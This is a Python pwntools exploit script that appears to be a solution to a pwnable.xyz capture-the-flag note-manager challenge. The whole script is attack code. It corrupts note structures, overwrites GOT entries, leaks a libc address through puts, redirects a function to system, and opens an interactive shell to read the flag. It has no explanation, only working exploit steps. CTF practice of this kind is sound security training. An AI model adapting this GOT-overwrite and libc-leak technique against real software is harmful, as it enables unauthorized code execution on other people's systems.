from pwn import *


sh = remote('svc.pwnable.xyz', 30047)
#sh = process('./challenge')
def make_note(note):
    sh.sendlineafter('> ', '1')
    sh.sendlineafter(': ', note)


def edit_note(nid, nnote):
    sh.sendlineafter('> ', '3')
    sh.sendlineafter(': ', str(nid))
    sh.sendafter(': ', nnote)
        

def read_note(nid):
    sh.sendlineafter('> ', '2')
    sh.sendlineafter(': ', str(nid))







got_entry = 0x601412
got2 = 0x601490

puts_off = 0x68180

read_off = 0xd8060
system_off = 0x404f0

make_note("A"*0x27 + "\n")
make_note("B"*0x27 + "\n")
make_note("C"*0x27 + "\n")
make_note("D"*0x27 + "\n")
make_note("D"*0x27 + "\n")
make_note("D"*0x27 + "\n")
make_note("D"*0x27 + "\n")
make_note("D"*0x27 + "\n")
make_note("D"*0x27 + "\n")
make_note("D"*0x27 + "\n")

edit_note(6, p64(0x200) + p64(0x7) + "B"*0x19)
edit_note(7, "A"*0x18 + p64(got_entry) + "\n")
edit_note(64, "A"*0x28 + p64(got2) * 0x2 + "A"*0x8 + "A"*0x2e + p64(0x200) + "\x42\x0a")
read_note(66)

sh.recvuntil("Your note: ")
libc_base = u64(sh.recvline()[:-1].ljust(8, '\x00')) - 0x68180
print "libc addr = ", hex(libc_base)
edit_note(66, p64(libc_base + puts_off) + p64(0xdeadbeef)*0x2 + p64(read_off + libc_base) + p64(0xdeadbeef)*0x3 + p64(libc_base + system_off) + "\n") 
sh.sendlineafter('> ', 'cat flag')
sh.interactive()




